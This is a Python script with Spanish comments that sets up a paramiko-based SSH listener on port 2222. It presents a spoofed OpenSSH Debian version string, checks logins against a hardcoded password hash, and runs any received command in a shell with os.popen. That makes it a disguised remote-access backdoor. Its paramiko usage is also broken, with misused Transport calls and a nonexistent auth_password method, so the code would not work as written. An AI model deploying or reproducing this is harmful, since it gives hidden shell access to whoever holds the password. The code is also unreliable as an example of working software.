import paramiko
import hashlib
import os

# Configuración del servidor SSH
HOST = '0.0.0.0'
PORT = 2222
KEYFILE = 'id_rsa'
FINGERPRINT = 'OpenSSH_8.2p1 Debian-4'
HASH = 'bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3'
SALT = '1c362db832f3f864c8c2fe05f2002a05'

# Función para verificar la contraseña
def verify_password(hash, salt, password):
    hashed_password = hashlib.sha512((password + salt).encode()).hexdigest()
    return hashed_password == hash

# Función para ejecutar comandos
def execute_command(command):
    return os.popen(command).read()

# Función de manejo de conexiones SSH
def handle_connection(client, addr):
    try:
        transport = paramiko.Transport(client)
        transport.add_server_key(paramiko.RSAKey(filename=KEYFILE))
        transport.start_server(server=paramiko.ServerInterface())

        channel = transport.accept(20)
        if channel is None:
            print(f'No se pudo abrir un canal de sesión para {addr}')
            return

        # Autenticación de contraseña
        auth_success = False
        while not auth_success:
            username, password = channel.auth_password()
            if verify_password(HASH, SALT, password):
                auth_success = True
            else:
                channel.send('Contraseña incorrecta. Inténtelo de nuevo.\n')

        # Ejecución de comandos
        while True:
            command = channel.recv(1024).decode().strip()
            if command == 'exit':
                break
            output = execute_command(command)
            channel.send(output)

    except Exception as e:
        print(f'Error en la conexión con {addr}: {str(e)}')

    finally:
        client.close()

# Configuración del servidor SSH
server = paramiko.Transport((HOST, PORT))
server.add_server_key(paramiko.RSAKey(filename=KEYFILE))
print(f'Servidor SSH iniciado en {HOST}:{PORT}')

# Aceptar conexiones entrantes
try:
    while True:
        client, addr = server.accept()
        print(f'Nueva conexión de {addr}')
        handle_connection(client, addr)
except KeyboardInterrupt:
    print('\nServidor SSH detenido')
    server.close()
